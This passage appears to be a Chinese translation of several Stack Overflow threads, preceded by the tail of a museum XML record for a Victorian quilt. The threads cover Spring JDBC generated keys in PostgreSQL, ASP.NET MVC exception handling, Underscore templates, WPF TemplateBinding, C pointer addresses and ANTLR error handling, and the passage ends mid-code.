<exhibition.venue>Shipley Art Gallery</exhibition.venue>
<exhibition.venue.place/>
</Exhibition>
<Exhibition>
<exhibition>Northern Quilts and Covers</exhibition>
<exhibition.catalogue_number/>
<exhibition.date.end>1990-05-13</exhibition.date.end>
<exhibition.date.start>1990-03-10</exhibition.date.start>
<exhibition.lref>3</exhibition.lref>
<exhibition.notes/>
<exhibition.organiser/>
<exhibition.reference_number/>
<exhibition.venue/>
<exhibition.venue.place/>
</Exhibition>
<Exhibition>
<exhibition>Bowes Museum</exhibition>
<exhibition.catalogue_number/>
<exhibition.date.end>1992-12-01</exhibition.date.end>
<exhibition.date.start>1991-05-01</exhibition.date.start>
<exhibition.lref>4</exhibition.lref>
<exhibition.notes>
Pieced and applied Quilt by Rebecca Temperley, Allendale, Northumberland, 1860 Plain and printed cottons, pieced and applied in a bordered design, quilted design echoes the applied design. The border has a "lined twist" quatrefoil hearts and leaf patterns. Underside of white cotton, hand-stitched edge. Gift of Mrs. Parker Q.18.1964.517 This fine quilt is said to have been made by Rebecca Temperley for her wedding in 1860\. The applique hearts and quatre foils, to represent the four-leafed clover, are motifs often associated with marriage quilts.
</exhibition.notes>
<exhibition.organiser/>
<exhibition.reference_number/>
<exhibition.venue/>
<exhibition.venue.place/>
</Exhibition>
<Exhibition>
<exhibition>North Country Quilts: Legend & Living Tradition</exhibition>
<exhibition.catalogue_number/>
<exhibition.date.end>2001-03-07</exhibition.date.end>
<exhibition.date.start>2000-08-05</exhibition.date.start>
<exhibition.lref>5</exhibition.lref>
<exhibition.notes>
Pieced and Appliqued quilt Made by Rebecca Temperley, probably in Allendale c.1860 (possibly for Rebecca's wedding) Printed and white cottons, reverse white cotton Bordered quilting design includes Clamshell, Wave, Cable Twist, and Geometric border with Roses. 274 x 274 cm (108 x 108 inches)
</exhibition.notes>
<exhibition.organiser/>
<exhibition.reference_number/>
<exhibition.venue>The Bowes Museum</exhibition.venue>
<exhibition.venue.place/>
</Exhibition>
<input.date>2000-12-05</input.date>
<input.name>Administrator</input.name>
<input.source>collect>intern</input.source>
<input.time>12:17:18</input.time>
<Label>
<label.text>
Maker Mrs. Rebecca Temperley Allendale, c.1860 (possibly for her wedding) Printed and white cotton, reverse white cotton. A bordered design includes Clamshell, Cable Twist, and Geometric border with Roses. Size: 274 x 274 cm.
</label.text>
<label.type>
<value lang="neutral">WEBTEXT</value>
<value lang="0">website text</value>
<value lang="1">website-tekst</value>
<value lang="2">texte site web</value>
<value lang="3">Website-Text</value>
<value lang="6">κείμενο διαδκτυακού τόπου</value>
</label.type>
</Label>
<Label>
<label.text>abcdefg</label.text>
<label.type>
<value lang="neutral">WEBTEXT</value>
<value lang="0">website text</value>
<value lang="1">website-tekst</value>
<value lang="2">texte site web</value>
<value lang="3">Website-Text</value>
<value lang="6">κείμενο διαδκτυακού τόπου</value>
</label.type>
</Label>
<Label>
<label.text>def</label.text>
<label.type>
<value lang="neutral">EDUCATIONALTEXT</value>
<value lang="0">educational text</value>
<value lang="1">educatieve tekst</value>
<value lang="2">texte éducatif</value>
<value lang="3">Museumspädagogischer Text</value>
<value lang="6">εκπαιδευτικό κείμενο</value>
</label.type>
</Label>
<location.default>Room 20 - Cube</location.default>
<location.default.lref>3500</location.default.lref>
<location.default.type/>
<Material>
<material>Cotton</material>
<material.lref>9</material.lref>
<material.notes/>
<material.part/>
</Material>
<notes>
Rebecca Temperley (active 1860). English (Allendale, Northumberland). Quilt, c.1860 Printed and white cottons, reverse white cotton. A bordered design includes Clamshell, Cable Twist, and Geometric border with Roses. Presented by Mrs Parker 1964.
</notes>
<object_category>Bedcovers or Coverlets</object_category>
<object_category.lref>426</object_category.lref>
<Object_name>
<object_name>
<value lang="">Quilt</value>
</object_name>
<object_name.authority/>
<object_name.authority.lref/>
<object_name.lref>17</object_name.lref>
<object_name.notes/>
<object_name.type>Pieced and Appliqued</object_name.type>
<object_name.type.lref>416</object_name.type.lref>
</Object_name>
<object_number>QUILT.18</object_number>
<priref>1</priref>
<Production>
<creator>
<value lang="">Temperley, Mrs Rebecca</value>
</creator>
<creator.date_of_birth/>
<creator.date_of_death/>
<creator.history/>
<creator.lref>1</creator.lref>
<creator.qualifier/>
<creator.role/>
<creator.role.lref/>
<production.notes/>
<production.place>Allendale</production.place>
<production.place.lref>5</production.place.lref>
</Production>
<production.period>19th century</production.period>
<production.period>Victorian</production.period>
<production.period.lref>13</production.period.lref>
<production.period.lref>12</production.period.lref>
<Production_date>
<production.date.end>1870</production.date.end>
<production.date.end.prec>circa</production.date.end.prec>
<production.date.start>1850</production.date.start>
<production.date.start.prec>circa</production.date.start.prec>
</Production_date>
<record_access.owner>null</record_access.owner>
<record_type>
<value lang="neutral">OBJECT</value>
<value lang="0">single object</value>
<value lang="2">objet individuel</value>
<value lang="3">Einzelnes Objekt</value>
</record_type>
<Reproduction>
<reproduction.creator/>
<reproduction.date/>
<reproduction.format/>
<reproduction.notes/>
<reproduction.reference>../../collections database/images/qlt-18.jpg</reproduction.reference>
<reproduction.reference.lref>1</reproduction.reference.lref>
<reproduction.type/>
<reproduction.web_exclusion/>
</Reproduction>
<Reproduction>
<reproduction.creator/>
<reproduction.date/>
<reproduction.format/>
<reproduction.notes/>
<reproduction.reference>
../../collections database/images/qlt-18-detail.jpg
</reproduction.reference>
<reproduction.reference.lref>2</reproduction.reference.lref>
<reproduction.type/>
<reproduction.web_exclusion/>
</Reproduction>
<Reproduction>
<reproduction.creator/>
<reproduction.date/>
<reproduction.format/>
<reproduction.notes/>
<reproduction.reference>
../../collections database/images/qlt-18-detail-b.jpg
</reproduction.reference>
<reproduction.reference.lref>3</reproduction.reference.lref>
<reproduction.type/>
<reproduction.web_exclusion/>
</Reproduction>
<Reproduction>
<reproduction.creator/>
<reproduction.date/>
<reproduction.format/>
<reproduction.notes/>
<reproduction.reference>
../../collections database/images/qlt-18-detail-c.jpg
</reproduction.reference>
<reproduction.reference.lref>4</reproduction.reference.lref>
<reproduction.type/>
<reproduction.web_exclusion/>
</Reproduction>
<Technique>
<technique>Pieced</technique>
<technique.lref>11</technique.lref>
<technique.notes/>
<technique.part/>
</Technique>
<Technique>
<technique>Applique</technique>
<technique.lref>7</technique.lref>
<technique.notes/>
<technique.part/>
</Technique>
<Technique>
<technique>Handsewn</technique>
<technique.lref>10</technique.lref>
<technique.notes/>
<technique.part/>
</Technique>
<Technique>
<technique>Patchwork</technique>
<technique.lref>6</technique.lref>
<technique.notes/>
<technique.part/>
</Technique>
<Title>
<title>
<value lang="">Patchwork Quilt</value>
</title>
</Title>
</record>
</recordList>
<diagnostic>
<hits>38049</hits>
<xmltype>Grouped</xmltype>
<first_item>1</first_item>
<search>All</search>
<sort/>
<limit>1</limit>
<hits_on_display>1</hits_on_display>
<response_time unit="mS" culture="en-GB">639.0639</response_time>
<xml_creation_time unit="mS" culture="en-GB">13.0013</xml_creation_time>
<link_resolve_time unit="mS" culture="en-GB">5.0005</link_resolve_time>
<dbname>collect</dbname>
<dsname>intern</dsname>
<cgistring>
<param name="database">ChoiceCollect</param>
</cgistring>
</diagnostic>
</adlibXML> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:14:40.483

您可以使用 MS SQL Server 全文功能来完成此操作，请参阅[使用 XML 列的全文搜索](http://msdn.microsoft.com/en-us/library/bb522491.aspx)

# java - 在 spring 3 / PostgreSQL 8.4.9 中从行插入中获取自动生成的键

> ID：10597477
> 
> 赞同：45
> 
> 时间：2012-05-15T09:06:34.093
> 
> 标签：java, spring, postgresql, jdbc, auto-generate

我想从行插入中检索自动生成的 id，但我得到一个`NullPointerException`

这是代码：

```
long result = 0;
        final String SQL = "INSERT INTO compte (prenom, nom, datenaissance, numtelephone) "
                            + " VALUES(?,?,?,?)";
        KeyHolder keyHolder = new GeneratedKeyHolder();
        int row= this.jdbcTemplate.update(new PreparedStatementCreator(){
            public PreparedStatement createPreparedStatement(Connection connection)
                throws SQLException {
                PreparedStatement ps =connection.prepareStatement(SQL);
                ps.setString(1, a.getSurname());
                ps.setString(2, a.getName());
                ps.setDate(3, a.getDob());
                ps.setString(4, a.getPhone());
                return ps;
            }
        },keyHolder);

        if (row > 0)
            result = keyHolder.getKey().longValue(); //line 72 
```

这是 PostgreSQL 表：

```
CREATE TABLE compte
(
  idcompte serial NOT NULL,
  prenom character varying(25) NOT NULL,
  nom character varying(25) NOT NULL,
  datenaissance date NOT NULL,
  numtelephone character varying(15) NOT NULL,
  CONSTRAINT pk_compte PRIMARY KEY (idcompte )
); 
```

PostgreSQL 支持自动生成的密钥，但我得到了这个异常：

```
java.lang.NullPointerException
    at com.tante.db.JDBCUserAccountDAO.insertAccount(JDBCUserAccountDAO.java:72) 
```

编辑：我试过这个来获取自动生成的密钥：

```
result = jdbcTemplate.queryForLong("select currval('compte_idcompte_seq')"); 
```

但我得到一个`PSQLException`：

`the current value (currval) of the sequence compte_idcompte_seq is not defined in this session`，虽然我认为`compte_idcompte_seq.NEXTVAL` 应该在插入行时调用

编辑 ：

插入行时正确创建自动增量值

任何的想法 ？

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2013-04-17T13:29:32.797

```
KeyHolder holder = new GeneratedKeyHolder();

getJdbcTemplate().update(new PreparedStatementCreator() {           

                @Override
                public PreparedStatement createPreparedStatement(Connection connection)
                        throws SQLException {
                    PreparedStatement ps = connection.prepareStatement(sql.toString(),
                        Statement.RETURN_GENERATED_KEYS); 
                    ps.setString(1, person.getUsername());
                    ps.setString(2, person.getPassword());
                    ps.setString(3, person.getEmail());
                    ps.setLong(4, person.getRole().getId());
                    return ps;
                }
            }, holder);

Long newPersonId = holder.getKey().longValue(); 
```

请注意，在较新版本的 Postgres 中，您需要使用

```
connection.prepareStatement(sql.toString(), 
    new String[] { "idcompte" /* name of your id column */ }) 
```

代替

```
connection.prepareStatement(sql.toString(), 
    Statement.RETURN_GENERATED_KEYS); 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-05-15T16:42:42.447

使用 Spring JDBC 从 INSERT 中获取密钥的最简单方法是使用`SimpleJdbcInsert`该类。您可以在 Spring 参考指南的标题为[使用 SimpleJdbcInsert 检索自动生成的键](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/jdbc.html#jdbc-simple-jdbc-insert-2)的部分中看到一个示例。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2013-11-27T05:32:51.847

我正在使用 Spring3.1 + PostgreSQL9.1，当我使用它时

```
 KeyHolder keyHolder = new GeneratedKeyHolder();
    jdbcTemplate.update(new PreparedStatementCreator() {
        public PreparedStatement createPreparedStatement(Connection connection)
                throws SQLException {
            PreparedStatement ps = 
                connection.prepareStatement(youSQL, 
                    Statement.RETURN_GENERATED_KEYS);
            ps.setString(1, post.name_author);
            ...
            return ps;
        }
    }, keyHolder);
    long id = keyHolder.getKey().longValue(); 
```

我得到了这个例外：

```
 org.springframework.dao.InvalidDataAccessApiUsageException: 
The getKey method should only be used when a single key is returned.  
The current key entry contains multiple keys: ... 
```

所以我改为：

```
PreparedStatement ps = 
connection.prepareStatement(youSQL, new String[]{"id"}); 
```

“id”在哪里

```
id serial not null primary key 
```

问题就解决了。所以我认为使用

```
prepareStatement(sql, Statement.RETURN_GENERATED_KEYS); 
```

不在这里。官方指南在[这里](http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/jdbc.html#jdbc-simple-jdbc-insert-2)，第 13.2.8 章：检索自动生成的密钥

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2015-11-25T09:11:32.027

使用带有 Sequence.nextval 的 NamedParameterJdbcTemplate 的解决方案：

```
 MapSqlParameterSource parameters = new MapSqlParameterSource();
        parameters.addValue("prenom", prenom);
        parameters.addValue("nom", nom);
        parameters.addValue("datenaissance", datenaissance);
        parameters.addValue("numtelephone", numtelephone);

    final String SQL = "INSERT INTO compte (idcompte,  prenom, nom, datenaissance, numtelephone) "
                        + " VALUES(compte_idcompte_seq.NEXTVAL, :prenom, :nom, :datenaissance, :numtelephone)";

        KeyHolder keyHolder = new GeneratedKeyHolder();
        NamedParameterJdbcTemplate namedJdbcTemplate = new NamedParameterJdbcTemplate(txManager.getDataSource());
        int nb = namedJdbcTemplate.update(SQL, parameters, keyHolder, new String[]{"idcompte"});
        Long generatedId = keyHolder.getKey().longValue(); 
```

我喜欢这个解决方案，因为使用 NamedParameterJdbcTemplate 因为参数是按名称传递的，并且代码更具可读性且不易出错，尤其是在有大查询时。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T09:33:55.507

Keyholder 和 PostgreSQL 似乎存在一些已知问题。查看此链接[Spring JDBC - Last inserted id上的解决方法](https://stackoverflow.com/questions/5703281/spring-jdbc-last-inserted-id)

还要直接检查数据库表以查看记录是否正确插入（即使用PK）。这将有助于缩小问题的范围。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-15T16:23:34.610

看看这篇文章，尤其是使用 INSERT...RETURNING 语法的公认答案：

[如何从最后插入的行中获取值？](https://stackoverflow.com/questions/241003/how-to-get-a-value-from-the-last-inserted-row)

这是在 PostgreSQL 中获取此值的最佳方式，因为您只需进行一次网络往返，并且它是作为服务器上的单个原子操作完成的。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-03-22T20:48:37.050

我遇到了同样的问题，结果我的表 ID 不是自动递增的。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-04-25T18:56:55.287

我遇到了类似的问题。我不知道我到底为什么会遇到这个问题，但好在我必须使用以下代码来解决这个问题：

```
final KeyHolder holder = new GeneratedKeyHolder();
int status = myTemplate.update(yourInsertSQL, namedParameters, holder, new String[]{"PrimaryKeyColumnName"}); 
```

希望对某人有所帮助。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-11-26T04:27:07.930

```
setGeneratedKeysColumnNames(new String[]{"column_name"}); 
```

不要忘记为自动生成的列设置名称。

# asp.net-mvc - ExceptionContext.ExceptionHandled 更改为 true。异常在哪里处理？

> ID：10597478
> 
> 赞同：9
> 
> 时间：2012-05-15T09:06:35.440
> 
> 标签：asp.net-mvc, asp.net-mvc-3, exception-handling, custom-error-pages

我正在使用全局操作过滤器来处理和记录所有异常。

```
 public static void RegisterGlobalFilters(GlobalFilterCollection filters)
    {
        filters.Add(new ElmahHandleErrorAttribute());
        filters.Add(new HandleErrorAttribute());
    } 
```

这就是全局操作过滤器`ElmahHandleErrorAttribute`的定义方式——它覆盖了`OnException`方法。

```
public class ElmahHandleErrorAttribute : System.Web.Mvc.HandleErrorAttribute
{
    public override void OnException(ExceptionContext context)
    {
       //Is the exception handled already? context.ExceptionHandled seems to be true here
        if (!context.IsChildAction && (context.HttpContext.IsCustomErrorEnabled))
        {
            //Do other stuff stuff
            //Log to Elmah               
        }
    }
   ...
 } 
```

我不明白为什么方法执行`context.ExceptionHandled`时的值为真。`OnException`如何处理此异常？

**-编辑-** 我`customErrors`在`Web.Config`. 我有一个`ErrorController`班级，以及名为`General`and的动作`Http404`。

```
<customErrors mode ="On" defaultRedirect="Error/General">
      <error statusCode="404" redirect="Error/Http404"/>
  </customErrors> 
```

*我不明白的是，控制器动作`General`没有执行（断点永远不会命中），但是当方法开始执行时，它的值`ExceptionContext.ExceptionHandled`设置为true 。`OnException``ElmahHandleErrorAttribute`*

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-18T10:21:19.090

当发生异常时，全局过滤器的执行[顺序是相反](http://msdn.microsoft.com/en-us/library/gg416513%28v=vs.98%29.aspx#sectionToggle4)的。这意味着`HandleErrorAttribute`先运行。

可以查看`HandleErrorAttribute` [这里](http://aspnetwebstack.codeplex.com/SourceControl/changeset/view/f2c3a69d7d92#src%2fSystem.Web.Mvc%2fHandleErrorAttribute.cs)的代码，简而言之就是：

1.  仅在`ExceptionHandled`为 false 时执行，并且启用了自定义错误。
2.  设置重定向到错误视图，默认情况下称为`Error`.
3.  **设置`ExceptionHandled`为真。**

因为它是第一个过滤器，`ExceptionHandled`所以它在执行时为假，导致它将视图设置为错误并设置`ExceptionHandled`为真。因此，当您自己的过滤器执行时，这就是为什么`ExceptionHandled`已经设置为 true。请注意，如果自定义错误被禁用，那么`ExceptionHandled`仍然是错误的，因为`HandleErrorAttribute`它不会完成它的工作。在这种情况下，ELMAH 无论如何都会记录错误，因为它没有被处理（黄色死屏），所以你班级的测试是为了防止重复记录错误。

现在，关于你的另一个问题，关于`General`为什么不执行操作，`defaultRedirect`只有在过滤器没有自己设置一些显式重定向时才使用它，所以当 ActionMethod 内部发生异常并且你`HandleErrorAttribute`注册了全局过滤器时，它实际上被忽略了. 但是，如果您输入了一个不存在的 URL，即不会在 ActionMethod 中发生的错误，它将被调用。此外，如果您注释掉`HandleErrorAttribute`在 Global.asax.cs 中注册的行，那么您将始终`General`执行控制器操作。

# iphone - CoreData 中带有新子项的新实体

> ID：10597479
> 
> 赞同：1
> 
> 时间：2012-05-15T09:06:35.713
> 
> 标签：iphone, ios, xcode, core-data, core-data-migration

我之前问过一个关于在 ElementListViewController 中合并屏幕的问题，并找到了解决我的问题的方法，但现在我有了一个新问题：

我有促销和优惠券，它们是 Element 的子实体。

现在我想要 Deal 它是 Element 的子实体，但它是 Promotion 和 Voucher 的父实体。

所以我的 CoreData 模型改变了，我有了一个新版本。但我确信这会因为这个（来自Apple Doc）而崩溃：

> 但是，您不能合并实体层次结构；如果两个现有实体在源中不共享一个共同的父项，则它们不能在目标中共享一个共同的父项。

那么如何在不崩溃的情况下构建我的新应用程序呢？我是否必须做一个映射模型，仅此而已？还是我必须进行迁移？这个 Apple Doc 非常完整，但我不确定是否真的理解。

谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T11:58:07.363

您需要进行手动迁移。我不知道这样做的正确方法是什么，但我以这种方式做过类似的事情——我创建新实体，并在自动迁移后进行自己的数据库更新，将记录从旧实体移动到新实体。不幸的是，数据模型中仍然有旧实体不再使用，这是坏事。

# javascript - 下划线模板中的布尔检查

> ID：10597480
> 
> 赞同：2
> 
> 时间：2012-05-15T09:06:44.163
> 
> 标签：javascript, templates, underscore.js, boolean-logic, underscore.js-templating

为了与 asp.net webforms 兼容，我不得不替换默认的下划线 teplating delimiters/Interpolate regex。从网站上我选择了类似 mustache 的语法

```
_.templateSettings = {
  interpolate : /\{\{(.+?)\}\}/g
}; 
```

试过这个

`_.template("{{if(loggedIn)Welcome {{name}}}}",{name:"James",completed:true});`

但似乎这不是使用模板系统检查布尔表达式的方式（因为发生错误）。但从文档看来这是可能的

> 以及执行任意 JavaScript 代码，使用 <% ... %>

*   那么我如何使用上述插值执行任意js代码

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-15T16:09:45.417

您的问题是您正在定义一个 Mustache 样式的替代品，`<%= ... %>`但试图在您通常使用的地方使用它`<% ... %>`。来自[精美手册](http://underscorejs.org/#template)：

> 定义一个**插值**正则表达式来匹配应该逐字插入的表达式，一个**转义**正则表达式来匹配应该在 HTML 转义后插入的表达式，以及一个**评估**正则表达式来匹配应该在不插入结果字符串的情况下计算的表达式。

所以有三个正则表达式在起作用：

1.  **插值**适用于`<%= ... %>`.
2.  **逃避**是为了`<%- ... %>`。
3.  **评估**是针对`<% ... %>`.

你告诉下划线使用`{{ ... }}`代替，`<%= ... %>`然后你得到一个错误，因为`if(loggedIn)`不能被插值。您只需要修复您的问题`_.templateSettings`以反映您正在尝试做的事情：

```
_.templateSettings = {
    evaluate:    /\{\{(.+?)\}\}/g,
    interpolate: /\{\{=(.+?)\}\}/g
}; 
```

然后您的模板将如下所示：

```
{{ if(loggedIn) { }}Welcome {{= name }} {{ } }} 
```

演示：http: [//jsfiddle.net/ambiguous/RwgVg/8/](http://jsfiddle.net/ambiguous/RwgVg/8/)

您需要在模板中包含`{`and `}`，因为`_.template`在编译模板时会添加分号，这会导致以下结果：

```
if(loggedIn) {; ... 
```

（感谢[JaredMcAteer](https://stackoverflow.com/users/577926/jaredmcateer)指出这一点）。

您可能还想添加一个**转义**正则表达式，那可能是`/\{\{-(.+?)\}\}/g`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T20:23:43.177

我相信这适用于向 mustache 样式语法的过渡：

```
/**
     * @configuration transform Underscore.js template syntax
     * @description change the Ruby on Rails style syntax to the Mustache syntax
     * @default <%= var %>
     * @modified 
     *  evaluate        {{ JavaScript code}}    execute arbitrary js code, such as loops
     *  interpolate     {{= variable }}         prints value of variables
     *  escape          {{- variable }}         this syntax will html escape variables
     */ 
    _.templateSettings = {
        evaluate:    /\{\{(.+?)\}\}/g,          
        interpolate: /\{\{=(.+?)\}\}/g,
        escape: /\{\{-(.+?)\}\}/g
    }; 
```

这将是 mustache 样式语法，但保留了使用“=”和“-”的原始选项。不使用任何一个评估 JS，例如 for 循环。可以交换它们，以便 {{var}} 是插值，而评估可以是其他东西，如果您愿意，可以保持模板更清洁，因为插值是最常用的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:18:41.440

只要您没有覆盖[Underscore.templateSettings.evaluate](https://github.com/documentcloud/underscore/blob/master/underscore.js#L938-942)设置，您仍然可以使用：`<% ... %>`评估代码。

我已经看到尝试定义与 Mustache 语法匹配的设置，但 Mustache 与*模板评估*`Underscore.templateSettings.evaluate`的斗争非常强大，所以会很困难。

# iphone - 触摸交互到 CorePlot

> ID：10597487
> 
> 赞同：2
> 
> 时间：2012-05-15T09:07:34.480
> 
> 标签：iphone, objective-c, xcode, touch, core-plot

我正在开发一个需要股票图表的 iPhone 应用程序。我遵循了一个很好的[与 CorePlot 交互的触摸](http://blog.essencework.com/post/9413676170/put-some-touch-interactive-to-coreplot-on-ipad-part-2)示例，在此示例中，它仅显示单点触摸。我怎样才能做到多点触控（如 iPhone 'Stocks'）？请你帮助我好吗？

# wpf - 什么是模板绑定与绑定？

> ID：10597492
> 
> 赞同：123
> 
> 时间：2012-05-15T09:08:07.413
> 
> 标签：wpf, mvvm-light

我无法理解`BorderThickness="{TemplateBinding BorderThickness}`。这里的代码：

```
<ControlTemplate TargetType="{x:Type wpftoolkit:DataGridCell}">
    <Border Padding="{TemplateBinding Padding}" 
            BorderBrush="{TemplateBinding BorderBrush}" 
            BorderThickness="{TemplateBinding BorderThickness}" 
            Background="{TemplateBinding Background}" 
            SnapsToDevicePixels="True">
        <ContentPresenter SnapsToDevicePixels="{TemplateBinding SnapsToDevicePixels}"/>
    </Border>
</ControlTemplate> 
```

还请解释其他类型的绑定。

* * *

## 回答 #1

> 赞同：215
> 
> 时间：2012-05-15T09:25:47.427

TemplateBinding 用于绑定到模板定义中的元素属性。在您的示例中，您可以编写：

```
 <Border Padding="{Binding Padding}" ...> 
```

...意思是将边框的填充属性绑定到...的填充属性是*什么？*您想说“使用此模板的控件的填充属性”。你不能给它一个名字，因为你现在不知道控件的 x:Name（即使你知道了，它也不起作用，因为它在不同的名称范围内）。但是，您可以通过定义相对源来做到这一点

```
<Border Padding="{Binding Padding, RelativeSource={RelativeSource TemplatedParent}" ...> 
```

或使用 TemplateBinding，这是上面的快捷方式（*）

```
<Border Padding="{TemplateBinding Padding}" ...> 
```

* * *

(*) 除了在这些模板场景中不那么冗长之外，TemplateBinding 与常规绑定相比还有一些不同之处：

*   它在编译时进行评估。（例如，如果 Padding 属性不存在，您会收到编译错误。但如果您使用 TemplatedParent 绑定，您只会在运行时看到错误。）
*   它始终是一种单向绑定。
*   它要求源属性和目标属性都是*依赖属性*。
*   它的功能要少得多（没有 StringFormat、Delay、IsAsync 等。请参阅[Binding](http://msdn.microsoft.com/en-us/library/system.windows.data.binding(v=vs.110).aspx)与[TemplateBindingExtention](http://msdn.microsoft.com/en-us/library/system.windows.templatebindingextension(v=vs.110).aspx)的属性）。

* * *

## 回答 #2

> 赞同：71
> 
> 时间：2016-03-11T16:23:35.683

一张图片胜过千言万语。在这种情况下，它是 7 分钟的视频：[https ://www.youtube.com/watch?v=z-0TZR-7xLI](https://www.youtube.com/watch?v=z-0TZR-7xLI)

**编辑：** 示例：

*   A`Button`有一个默认`ControlTemplate`属性和`Height`属性
*   您通过编写自己的来覆盖`ControlTemplate`a 的属性（例如，您想制作一个-looking 按钮而不是-looking ）`Button``Ellipse``Rectangle`
*   在你`Ellipse`的 new 中创建后`ControlTemplate`，你希望 与原始 Button 的属性`Ellipse`大小相同`Height`
*   所以你使用`TemplateBinding`为了引用`Button`'s`Height`而不是命名它[![在此处输入图像描述](../Images/fa0d78e3f65c2231a7b69a2c988c70e0.png)](https://i.stack.imgur.com/sqvTN.png)

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2012-05-15T09:33:57.917

Eren Ersönmenz 已经很好地解释了它，但我想给它另一个视角以更好地理解这个概念。

在 WPF 中，每个控件都或多或少地与其表示分离。您可以随时更改控件模板并使其看起来完全不同。按钮按预期工作，`ControlTemplate`仅由`Rectangle`例如 a 组成。现在有时需要`ControlTemplate`实际使用控件逻辑部分的属性。这就是它的用途`TemplateBinding`，它只是告诉`ControlTemplate`“使用我们提供视觉呈现的控件的这个属性”。一个很好的例子是`Background`每个控件上的属性，它本身没有意义，它通过`TemplateBinding`它来获取它的意义给`ControlTemplate`.

[MSDN](http://msdn.microsoft.com/en-us/library/ms752347.aspx)中对绑定本身进行了很好的描述。[这](http://www.nbdtech.com/Free/WpfBinding.pdf)是一张非常漂亮的备忘单，实际上它就挂在我旁边的墙上。它很好地概述了所有可用的不同绑定。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-05-15T09:29:23.580

从[TemplateBinding Markup Extension](http://msdn.microsoft.com/en-us/library/ms742882.aspx)，`TemplateBinding`将控件模板中的属性值链接到模板化控件上的某些其他公开属性的值。换句话说，它用于绑定模板中的值。

[绑定](http://msdn.microsoft.com/en-us/library/system.windows.data.binding%28v=vs.100%29.aspx)连接绑定目标和数据源的属性。

# c - 指针地址如何具有不同的长度？

> ID：10597493
> 
> 赞同：1
> 
> 时间：2012-05-15T09:08:24.637
> 
> 标签：c, pointers, c99, pointer-address

我刚刚执行了这个代码示例：

```
int *i = (int*) malloc( sizeof(int) );
printf( "%p, %p\n", &i , i ); 
```

这就是我得到的：

```
0x7fff38fed6a8, 0x10f7010 
```

所以我想知道为什么第二个地址比第一个短？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:13:37.927

`i`它在堆栈上，而它指向的内存块在堆中。在您的平台上，这是两个非常不同的内存区域，恰好堆地址在数字上相对较低，因此它有很多未显示的前导零，即

```
&i = 0x7fff38fed6a8; // stack
 i = 0x0000010f7010; // heap 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T09:12:40.447

`i`是堆上的地址，`&i`而是栈上的地址。堆和栈占用不同的地址范围，所以你会看到不同的数字。

指针实际上并没有不同的长度：较短的指针前面有零。您可能在 64 位机器上运行它，因此每个指针都有 64 位（16 个十六进制数字）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:11:15.617

格式说明符不要求`%p`将输出填充到任何固定长度。因此，您无法从打印的表示中推断出有关地址的内存“长度”的任何信息。例如，如果您这样做：

```
const void *nada = NULL;

printf("NULL is at %p\n", nada); 
```

你可能会看到这样的东西：

```
NULL is at 0x0 
```

当然，这并不是说`void *`当值是 时，类型神奇地只占用了 4 位`NULL`，它只是意味着当指针值转换为字符串时，前导零被省略了。

**更新**：误读了问题的代码，我删除了不相关的文本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T09:13:20.343

它不是更短，只是数字更小。指针 &i 在堆栈上，而 i 在堆上。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T11:15:27.427

除了其他答案：

由于您没有包含`<stdlib.h>`，因此编译器很有可能错误地假定 malloc 返回`int`而不是`void*`. 这可能是一个严重的错误，您已经使用 malloc 返回值的类型转换隐藏了它。阅读[这个](http://c-faq.com/malloc/mallocnocast.html)和[这个](https://stackoverflow.com/questions/1565496/specifically-whats-dangerous-about-casting-the-result-of-malloc)。

如果`int`与特定系统上的地址总线宽度不同，例如在许多 16 位或 64 位 CPU 上，您将得到不正确的结果。

# c# - ANTLR C# 没有抛出异常

> ID：10597507
> 
> 赞同：0
> 
> 时间：2012-05-15T09:09:27.313
> 
> 标签：c#, antlr

我开始学习如何在 Visual Studio 中使用 antlr，但我无法获得一个基本的示例！

这是我正在使用的语法：

```
grammar T;

options {
    language=CSharp3;
    TokenLabelType=CommonToken;
}
@lexer::namespace {CoolTool.CoolProject.Compiler} 
@parser::namespace {CoolTool.CoolProject.Compiler}

/*
 * Parser Rules
 */

compileUnit
    : 'a' AFTER
    ;

AFTER
    :    'after'
    ;

WS
    : (' '|'\r'|'\t'|'\u000C'|'\n'); 
```

这是实例化词法分析器和语法的 C# 代码

```
using System;
using Antlr.Runtime;
namespace CoolTool.CoolProject.Compiler
partial class TParser
    {
        public static void Main(String[] args)
        {
            TLexer lexer = new TLexer(new ANTLRStringStream("$$%$%"));
            CommonTokenStream tokens = new CommonTokenStream(lexer);
            TParser parser = new TParser(tokens);

            parser.compileUnit();

            Console.WriteLine("OK");

        }
    }
} 
```

问题是，无论我将什么传递给词法分析器/解析器，我都不会收到任何错误。我很困惑为什么我没有得到“$$”的 NoViableAltException？

任何人都可以帮忙吗？

谢谢，阿米尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-24T16:00:29.350

我使用 antlr3.4，并处理如下异常：

```
 ICharStream input = new ANTLRStringStream(_expressionString);
        ExpressionLexer lex = new ExpressionLexer(input);

        CommonTokenStream tokens = new CommonTokenStream(lex);
        ExpressionParser parser = new ExpressionParser(tokens);
        AstParserRuleReturnScope<CommonTree, CommonToken> r = parser.expression();

        if (lex.HasError)
        {
